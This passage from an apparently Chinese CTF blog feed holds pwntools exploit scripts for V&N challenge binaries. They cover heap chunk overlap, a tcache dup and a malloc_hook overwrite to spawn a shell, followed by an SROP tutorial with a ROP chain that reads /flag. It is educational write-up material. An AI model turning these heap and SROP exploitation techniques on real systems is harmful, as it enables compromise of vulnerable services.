class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'vn.node3.buuoj.cn'</span>,<span class="number">52145</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(lenght,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(lenght))</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'\x00'</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x58</span>,<span class="string">'\x00'</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'\x00'</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x18</span>+<span class="string">'\xd1'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'A'</span>) <span class="comment"># 1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) <span class="number">-0x3c4c41</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span>  </span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># free fastbin</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">11</span>+p64(one_gadget)+p64(realloc+<span class="number">14</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,str(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h2><p>ubuntu18.04的uaf漏洞，有tcache机制，限制了free的次数为3，申请一个0x88的堆块释放两次，可以先利用Tcache dup泄露Heap address，然后再申请劫持Tcache structure，向任意地址读写，向malloc_hook写one_gadget完成利用，但是此处所有的one_gadget条件均不满足，因此需要利用realloc函数调整栈帧才能利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line">p.sendafter(<span class="string">'content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'4'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">p = process(<span class="string">'vn_pwn_easyTHeap'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 1</span></span><br><span class="line"> </span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'heap_addr'</span>,heap_addr))</span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_addr<span class="number">-0x250</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3ebca0</span></span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'libc_base'</span>,libc_base))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(malloc_hook<span class="number">-0x8</span>))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 5</span></span><br><span class="line">edit(<span class="number">5</span>,p64(one_gadget)+p64(realloc+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x66</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   rcx == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f322 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x40] == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x10a38c execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x70] == NULL</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;V-amp-N招新赛writeup&quot;&gt;&lt;a href=&quot;#V-amp-N招新赛writeup&quot; class=&quot;headerlink&quot; title=&quot;V&amp;amp;N招新赛writeup&quot;&gt;&lt;/a&gt;V&amp;amp;N招新赛writeup&lt;/h1&gt;&lt;p&gt;参考链接:&lt;a hr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>SROP</title>
    <link href="https://nocbtm.github.io/2020/02/28/SROP/"/>
    <id>https://nocbtm.github.io/2020/02/28/SROP/</id>
    <published>2020-02-28T09:27:56.000Z</published>
    <updated>2020-04-11T13:41:49.269Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是SROP"><a href="#什么是SROP" class="headerlink" title="什么是SROP"></a>什么是SROP</h2><p><code>SROP</code> 全称<code>Sigreturn Oriented Programming</code>，<code>sigreturn</code>是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用。</p><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。一般来说，信号机制常见的步骤如下图所示：</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-1.png" class="lozad"></p><p>包含的流程包括：</p><ol><li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li><li>内核会为该进程保存相应的上下文，将当前的信息压入栈中（栈寄存器等），以及将 sigreturn系统调用地址压入栈中。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</li><li>执行 sigreturn 系统调用，恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119，64 位的系统调用号为 15。</li></ol><p>保存在栈中的进程上下文信息为<code>ucontext_t</code>结构体，称其为<code>Signal Frame</code>，其结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// defined in /usr/include/sys/ucontext.h</span></span><br><span class="line"><span class="comment">/* Userlevel context.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> uc_flags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span> *<span class="title">uc_link</span>;</span></span><br><span class="line">    <span class="keyword">stack_t</span> uc_stack;           <span class="comment">// the stack used by this context</span></span><br><span class="line">    <span class="keyword">mcontext_t</span> uc_mcontext;     <span class="comment">// the saved context</span></span><br><span class="line">    <span class="keyword">sigset_t</span> uc_sigmask;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpstate</span> __<span class="title">fpregs_mem</span>;</span></span><br><span class="line">  &#125; <span class="keyword">ucontext_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// defined in /usr/include/bits/types/stack_t.h</span></span><br><span class="line"><span class="comment">/* Structure describing a signal stack.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ss_sp;</span><br><span class="line">    <span class="keyword">size_t</span> ss_size;</span><br><span class="line">    <span class="keyword">int</span> ss_flags;</span><br><span class="line">  &#125; <span class="keyword">stack_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// difined in /usr/include/bits/sigcontext.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> __pad0;</span><br><span class="line">  <span class="keyword">__uint64_t</span> err;</span><br><span class="line">  <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">  <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由于<code>Signal Frame</code>是在用户态的栈中，因此若在栈中伪造<code>Signal Frame</code>，同时调<code>sigreturn</code>系统调用，即可实现对所有寄存器的控制包括rip，从而实现攻击。</p><p>如若只想调用执行一个函数，如get shell，则可直接将rip指向system，将rdi指向binsh地址即可，如下图所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-2.png" class="lozad"></p><p>如果想执行一系列函数，我们可以通过rsp指针来实现相应的rop链，包括两个步骤：</p><ul><li>控制栈指针。</li><li>把原来 rip 指向的syscall gadget 换成syscall; ret gadget。</li></ul><p>示意图如下所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-3.png" class="lozad"></p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>以V&amp;N招新赛babypwn为例</p><p>思路如下：</p><p>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><p>参考文章  :</p><p><a 